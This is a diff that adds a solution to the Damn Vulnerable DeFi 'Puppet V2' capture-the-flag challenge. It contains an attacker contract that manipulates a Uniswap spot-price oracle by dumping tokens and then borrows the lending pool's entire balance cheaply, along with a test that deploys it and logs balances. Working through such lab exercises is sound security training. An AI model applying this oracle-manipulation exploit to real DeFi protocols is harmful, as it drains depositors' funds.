@@ -10,6 +10,75 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+// Attacker contract to execute everything in a single transaction
+contract PuppetV2Attacker {
+    IUniswapV2Router02 private uniswapRouter;
+    DamnValuableToken private token;
+    WETH private weth;
+    PuppetV2Pool private lendingPool;
+    address private recovery;
+    uint256 private poolInitialBalance;
+
+    constructor(
+        address _tokenAddress,
+        address payable _wethAddress,
+        address _uniswapRouterAddress,
+        address _lendingPoolAddress,
+        address _recoveryAddress,
+        uint256 _poolInitialBalance
+    ) {
+        token = DamnValuableToken(_tokenAddress);
+        weth = WETH(_wethAddress);
+        uniswapRouter = IUniswapV2Router02(_uniswapRouterAddress);
+        lendingPool = PuppetV2Pool(_lendingPoolAddress);
+        recovery = _recoveryAddress;
+        poolInitialBalance = _poolInitialBalance;
+    }
+
+    function attack() external payable {
+        // Step 1: Approve tokens for the Uniswap router
+        token.approve(address(uniswapRouter), type(uint256).max);
+        
+        // Step 2: Swap almost all tokens for WETH to manipulate the price
+        uint256 tokensToSwap = token.balanceOf(address(this)) - 1e18; // Keep some tokens
+        
+        // Create the swap path: token -> WETH
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        
+        // Execute the swap
+        uniswapRouter.swapExactTokensForETH(
+            tokensToSwap,
+            1, // Accept any amount of ETH
+            path,
+            address(this), // Receive ETH here
+            block.timestamp + 1 hours
+        );
+        
+        // Step 3: Convert ETH to WETH
+        weth.deposit{value: address(this).balance}();
+        
+        // Step 4: Approve WETH for the lending pool
+        weth.approve(address(lendingPool), type(uint256).max);
+        
+        // Step 5: Borrow all tokens from the lending pool
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        lendingPool.borrow(poolBalance);
+        
+        // Step 6: Transfer только токены из пула на recovery адрес
+        token.transfer(recovery, poolInitialBalance);
+        
+        // Return any remaining ETH to the caller
+        if (address(this).balance > 0) {
+            payable(msg.sender).transfer(address(this).balance);
+        }
+    }
+    
+    // To receive ETH from Uniswap router
+    receive() external payable {}
+}
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -98,7 +167,41 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        console.log("\n[*] Initial state:");
+        console.log("Player ETH balance:", player.balance);
+        console.log("Player token balance:", token.balanceOf(player));
+        console.log("Uniswap pair WETH balance:", weth.balanceOf(address(uniswapV2Exchange)));
+        console.log("Uniswap pair token balance:", token.balanceOf(address(uniswapV2Exchange)));
+        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
         
+        // Calculate initial deposit required
+        uint256 initialDepositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Initial WETH deposit required to borrow all tokens:", initialDepositRequired);
+        
+        // Deploy the attacker contract
+        PuppetV2Attacker attacker = new PuppetV2Attacker(
+            address(token),
+            payable(address(weth)),
+            address(uniswapV2Router),
+            address(lendingPool),
+            recovery,
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        
+        // Transfer all tokens to the attacker contract
+        token.transfer(address(attacker), token.balanceOf(player));
+        
+        console.log("\n[*] Executing attack in a single transaction...");
+        
+        // Execute the attack in a single transaction
+        (bool success, ) = address(attacker).call{value: player.balance}(abi.encodeWithSignature("attack()"));
+        require(success, "Attack failed");
+        
+        // Final state
+        console.log("\n[*] Final state:");
+        console.log("Player ETH balance:", player.balance);
+        console.log("Recovery token balance:", token.balanceOf(recovery));
+        console.log("Lending pool token balance:", token.balanceOf(address(lendingPool)));
     }
 
     /**
